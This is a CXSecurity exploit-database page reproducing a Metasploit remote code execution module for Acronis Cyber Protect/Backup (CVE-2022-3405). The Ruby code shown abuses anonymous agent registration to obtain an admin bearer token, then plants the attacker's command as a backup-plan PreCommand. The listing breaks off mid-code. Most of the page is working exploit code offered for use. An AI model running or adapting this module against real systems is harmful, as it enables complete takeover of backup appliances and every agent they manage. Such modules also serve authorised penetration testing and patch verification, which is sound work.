---
title: Acronis Cyber Protect/Backup Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024120011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-12-08
fetch_date: 2025-10-06T19:37:21.264724
---

# Acronis Cyber Protect/Backup Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Acronis Cyber Protect/Backup Remote Code Execution** **2024.12.07**  Credit:  **[h00die-gr3y](https://cxsecurity.com/author/h00die-gr3y/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Auxiliary::Report
include Msf::Exploit::Remote::HTTP::AcronisCyber
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Acronis Cyber Protect/Backup remote code execution',
'Description' => %q{
Acronis Cyber Protect or Backup is an enterprise backup/recovery solution for all,
compute, storage and application resources. Businesses and Service Providers are using it
to protect and backup all IT assets in their IT environment.
The Acronis Cyber Protect appliance, in its default configuration, allows the anonymous
registration of new protect/backup agents on new endpoints. This API endpoint also
generates bearer tokens which the agent then uses to authenticate to the appliance.
As the management web console is running on the same port as the API for the agents, this
bearer token is also valid for any actions on the web console. This allows an attacker
with network access to the appliance to start the registration of a new agent, retrieve a
bearer token that provides admin access to the available functions in the web console.
The web console contains multiple possibilities to execute arbitrary commands on both the
agents (e.g., via PreCommands for a backup) and also the appliance (e.g., via a Validation
job on the agent of the appliance). These options can easily be set with the provided bearer
token, which leads to a complete compromise of all agents and the appliance itself.
You can either use the module `auxiliary/gather/acronis\_cyber\_protect\_machine\_info\_disclosure`
to collect target info for exploitation in this module. Or just run this module standalone and
it will try to exploit the first online endpoint matching your target and payload settings
configured at the module.
Acronis Cyber Protect 15 (Windows, Linux) before build 29486 and
Acronis Cyber Backup 12.5 (Windows, Linux) before build 16545 are vulnerable.
},
'Author' => [
'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module
'Sandro Tolksdorf of usd AG.' # discovery
],
'References' => [
['CVE', '2022-3405'],
['URL', 'https://herolab.usd.de/security-advisories/usd-2022-0008/'],
['URL', 'https://attackerkb.com/topics/WVI3r5eNIc/cve-2022-3405']
],
'License' => MSF\_LICENSE,
'Platform' => ['unix', 'linux', 'windows'],
'Privileged' => true,
'Arch' => [ARCH\_CMD],
'Targets' => [
[
'Unix/Linux Command',
{
'Platform' => ['unix', 'linux'],
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd
}
],
[
'Windows Command',
{
'Platform' => ['windows'],
'Arch' => ARCH\_CMD,
'Type' => :win\_cmd
}
]
],
'DefaultTarget' => 0,
'DisclosureDate' => '2022-11-08',
'DefaultOptions' => {
'SSL' => true,
'RPORT' => 9877
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'SideEffects' => [ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS],
'Reliability' => [REPEATABLE\_SESSION]
}
)
)
register\_options([
OptString.new('TARGETURI', [true, 'The URI of the vulnerable Acronis Cyber Protect/Backup instance', '/']),
OptString.new('HOSTID', [false, 'hostId value collected from recon module "auxiliary/gather/acronis\_cyber\_protect\_machine\_info\_disclosure"', '']),
OptString.new('PARENTID', [false, 'parentId value collected from recon module "auxiliary/gather/acronis\_cyber\_protect\_machine\_info\_disclosure"', '']),
OptString.new('KEY', [false, 'key value collected from recon module "auxiliary/gather/acronis\_cyber\_protect\_machine\_info\_disclosure"', '']),
OptEnum.new('OUTPUT', [true, 'Output format to use', 'none', ['none', 'json']])
])
end
# create and import backup plan data with payload
# returns nil if not successful
def create\_and\_import\_backup\_plan(hostid, parentid, key, payload, access\_token2)
id = Faker::Internet.uuid
name = Rex::Text.rand\_text\_alphanumeric(5..8).downcase
# we need to split the payload in the command and the arguments
# otherwise command execution does not work for windows targets
cmd\_line = payload.split(' ', 2)
case target['Type']
when :unix\_cmd
source\_dir = '/home'
target\_dir = '/tmp'
when :win\_cmd
source\_dir = 'c:/users/public'
target\_dir = 'c:/windows/temp'
else
# probably macOS or other unix version
source\_dir = '/home'
target\_dir = '/tmp'
end
plan\_data = {
allowedActions: ['rename', 'revoke', 'runNow'],
allowedBackupTypes: ['full', 'incremental'],
backupType: 'files',
bootableMediaPlan: false,
editable: true,
enabled: true,
id: id.to\_s,
locations: { data: [{ displayName: target\_dir.to\_s, id: "[[\"ItemType\",\"local\_folder\"],[\"LocalID\",\"#{target\_dir}\"]]", type: 'local\_folder' }] },
name: name.to\_s,
options: {
backupOptions: {
prePostCommands: {
postCommands: { command: '', commandArguments: '', continueOnCommandError: false, waitCommandComplete: true, workingDirectory: '' },
preCommands: {
command: cmd\_line[0].to\_s,
commandArguments: cmd\_line[1].to\_s,
continueOnCommandError: true,
waitCommandComplete: false,
workingDirectory: ''
},
useDefaultCommands: false,
usePostCommands: false,
usePreCommands: true
},
prePostDataCommands: {
postCommands: { command: '', commandArguments: '', continueOnCommandError: false, waitCommandComplete: true, workingDirectory: '' },
preCommands: { command: '', commandArguments: '', continueOnCommandError: false, waitCommandComplete: true, workingDirectory: '' },
useDefaultCommands: true,
usePostCommands: false,
usePreCommands: false
},
scheduling: { interval: { type: 'minutes', value: 30 }, type: 'distributeBackupTimeOptions' },
simultaneousBackups: { simultaneousBackupsNumber: nil },
snapshot: {
quiesce: true,
retryConfiguration: {
reattemptOnError: true,
reattemptTimeFrame: { type: 'minutes', value: 5 },
reattemptsCount: 3,
silentMode: false
}
},
tapes...